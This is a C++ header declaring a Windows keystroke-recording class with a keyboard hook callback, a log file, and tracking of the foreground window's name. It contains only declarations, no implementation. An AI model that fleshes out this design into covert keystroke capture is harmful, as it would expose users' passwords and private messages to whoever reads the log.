#pragma once

#include <string>
#include <vector>
#include <Windows.h>

class KeystrokesRecorder
{
	HANDLE threadHandle;

	std::string logFileName;

	static HANDLE logFileHandle;

	static std::wstring lastForegroundWindowName;

	static HANDLE threadCreatedMessageQueueEventHandle;

	static void writeToLogFile(const char* text, DWORD textLength);

	static unsigned int WINAPI threadProcedure(void* threadParameter);

	static LRESULT CALLBACK keyboardHookProcedure(int code, WPARAM wparameter, LPARAM lparameter);

	KeystrokesRecorder(const std::string& logFileName);

public:
	KeystrokesRecorder(const KeystrokesRecorder&) = delete;

	void operator=(const KeystrokesRecorder&) = delete;

	~KeystrokesRecorder();

	void stopRecording();

	void startRecording();

	std::string getLogFileName();

	static KeystrokesRecorder* getInstance();
};
